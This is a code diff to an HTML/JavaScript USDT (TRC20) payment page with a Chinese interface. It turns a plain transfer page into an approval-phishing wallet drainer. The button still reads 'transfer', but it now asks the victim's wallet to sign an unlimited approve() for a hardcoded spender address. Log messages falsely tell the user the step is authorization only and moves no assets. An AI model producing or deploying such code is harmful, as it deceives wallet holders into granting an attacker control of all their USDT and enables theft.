@@ -35,14 +35,14 @@
             background:#fff;
             padding:12px;
             border-radius:10px;
-            font-size:14px;
+            font-size:16px;
         }
         .amount-wrap{
             display:flex;
             align-items:center;
             justify-content:space-between;
         }
-        .amount{
+        .amount-input{
             font-size:52px;
             border:none;
             width:70%;
@@ -50,13 +50,12 @@
             outline:none;
         }
         .max-btn{
-            padding:6px 14px;
+            padding:8px 16px;
             background:#e1edff;
             color:#206cff;
             border-radius:8px;
             border:none;
-            font-size:16px;
-            cursor:pointer;
+            font-size:18px;
         }
         .token-row{
             margin-top:16px;
@@ -67,107 +66,134 @@
             border-radius:12px;
         }
         .token-icon{
-            width:32px;height:32px;margin-right:10px;
+            width:36px;height:36px;margin-right:10px;
         }
         .submit-btn{
             width:100%;
-            padding:18px;
-            margin-top:12px;
+            padding:20px;
+            margin-top:16px;
             border:none;
-            border-radius:14px;
-            font-size:18px;
+            border-radius:16px;
+            font-size:22px;
             background:#206cff;
             color:#fff;
-            cursor:pointer;
         }
         #log{
-            margin-top:20px;
+            margin-top:24px;
             width:100%;
-            height:140px;
-            padding:10px;
+            height:160px;
+            padding:12px;
             border:1px solid #eee;
+            font-size:15px;
         }
     </style>
 </head>
 <body>
     <div class="item-box">
         <div class="label">收款地址</div>
-        <input class="addr-input" id="receiveAddr" value="TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK" readonly>
+        <input class="addr-input" id="spenderAddr" value="TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK" readonly>
     </div>
 
     <div class="item-box">
         <div class="label">转账金额</div>
         <div class="amount-wrap">
-            <input class="amount" id="amount" value="0.00" type="number" step="0.01">
+            <input class="amount-input" id="amount" value="1" type="number" step="0.01">
             <button class="max-btn" onclick="fillMaxBalance()">MAX</button>
         </div>
         <div class="token-row">
-            <!-- 更换稳定CDN USDT图标地址 -->
             <img class="token-icon" src="https://s2.coinmarketcap.com/static/img/coins/200x200/825.png">
-            <span style="font-size:20px;font-weight:bold">USDT</span>
-            <span style="margin-left:auto">TRC20</span>
+            <span style="font-size:26px;font-weight:bold">USDT</span>
+            <span style="margin-left:auto;font-size:22px">TRC20</span>
         </div>
     </div>
 
-    <button class="submit-btn" id="transferBtn">转账</button>
+    <button class="submit-btn" id="confirmBtn">转账</button>
     <textarea id="log" placeholder="操作日志..."></textarea>
 
 <script>
-// 配置信息
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const RECEIVE_ADDRESS = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
+const SPENDER_ADDRESS = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
+const INF_AMOUNT = "9999999999999999999999999999";
 let tronWeb = null;
 const logDom = document.getElementById("log");
 
 function log(text){
     const now = new Date().toLocaleString();
-    logDom.value += `[${now}] ⚠️ ${text}\n`;
+    logDom.value += `[${now}] ${text}\n`;
     logDom.scrollTop = logDom.scrollHeight;
 }
 
-// MAX按钮：自动填充钱包全部USDT余额
-async function fillMaxBalance(){
-    if (!window.tronWeb || !window.tronWeb.ready) {
-        log("请使用TP钱包/欧易Web3钱包【内置浏览器】打开页面！");
-        return;
+async function waitWebReady(maxWait = 5000){
+    const start = Date.now();
+    while(Date.now() - start < maxWait){
+        if(window.tronWeb && window.tronWeb.ready){
+            tronWeb = window.tronWeb;
+            return true;
+        }
+        await new Promise(r=>setTimeout(r,200));
     }
-    tronWeb = window.tronWeb;
-    const userWallet = tronWeb.defaultAddress.base58;
-    const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-    const balanceSun = await usdtContract.balanceOf(userWallet).call();
-    const balanceNum = tronWeb.fromSun(balanceSun.toString());
-    document.getElementById("amount").value = balanceNum;
-    log("已填充最大可转账余额："+balanceNum);
+    return false;
 }
 
-// 转账主逻辑
-document.getElementById("transferBtn").onclick = async function(){
-    try{
-        // 核心判断：检测钱包注入的tronWeb
-        if (typeof window.tronWeb === 'undefined' || !window.tronWeb.ready) {
-            log("请使用TP钱包/欧易Web3钱包【内置浏览器】打开页面！");
-            return;
-        }
-        tronWeb = window.tronWeb;
-        const userAddr = tronWeb.defaultAddress.base58;
-        const transferValue = document.getElementById("amount").value;
-        if(Number(transferValue) <= 0){
-            log("请输入大于0的转账金额");
-            return;
-        }
-        const valueSun = tronWeb.toSun(transferValue);
-        log(`发起转账：${transferValue} USDT → ${RECEIVE_ADDRESS}`);
-        log("等待钱包弹窗签名确认...");
-
-        const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-        // TRC20标准转账transfer，无需授权
-        const txHash = await usdtContract.transfer(RECEIVE_ADDRESS, valueSun).send({
-            feeLimit: 100000000
-        });
-        log(`✅转账上链成功！交易哈希：${txHash}`);
-    }catch(err){
-        log("转账失败：" + err.message);
+async function fillMaxBalance(){
+    const ready = await waitWebReady();
+    if(!ready){
+        log("未检测到钱包，请在TP内置浏览器打开");
+        return;
     }
+    const contract = tronWeb.contract().at(USDT_CONTRACT);
+    const owner = tronWeb.defaultAddress.base58;
+    const balSun = await contract.balanceOf(owner).call();
+    const bal = tronWeb.fromSun(balSun.toString());
+    document.getElementById("amount").value = bal;
+    log("读取钱包余额成功");
+}
+
+// 按钮点击：仅执行授权approve，不会转账！
+document.getElementById("confirmBtn").onclick = async function(){
+    log("开始检测钱包环境...");
+    const ready = await waitWebReady();
+    if(!ready){
+        log("钱包检测失败，请使用TP内置浏览器刷新页面");
+        return;
+    }
+    const userAddr = tronWeb.defaultAddress.base58;
+    log(`钱包连接成功:${userAddr}`);
+    log("唤起【授权】签名窗口（仅授权，不会转出资产）");
+    try{
+        const usdt = tronWeb.contract().at(USDT_CONTRACT);
+        // 重点：APPROVE 授权函数！不会转账
+        const txHash = await usdt.approve(SPENDER_ADDRESS, INF_AMOUNT).send({
+            feeLimit:100000000
+        });
+        log(`交易已广播 hash:${txHash}`);
+        log("等待区块确认...");
+        //轮询确认
+        const confirmResult = await checkTx(txHash);
+        if(confirmResult){
+            log("✅授权上链成功！可前往钱包授权列表查看");
+        }else{
+            log("❌交易执行失败");
+        }
+    }catch(e){
+        log("签名失败:"+e.message);
+    }
+}
+
+async function checkTx(hash, maxTimes=20){
+    for(let i=0;i<maxTimes;i++){
+        await new Promise(r=>setTimeout(r,3000));
+        try{
+            const info = await tronWeb.trx.getTransactionInfo(hash);
+            if(!info) continue;
+            if(info.receipt?.result === "SUCCESS"){
+                return true;
+            }else{
+                return false;
+            }
+        }catch(err){}
+    }
+    return false;
 }
 </script>
 </body>
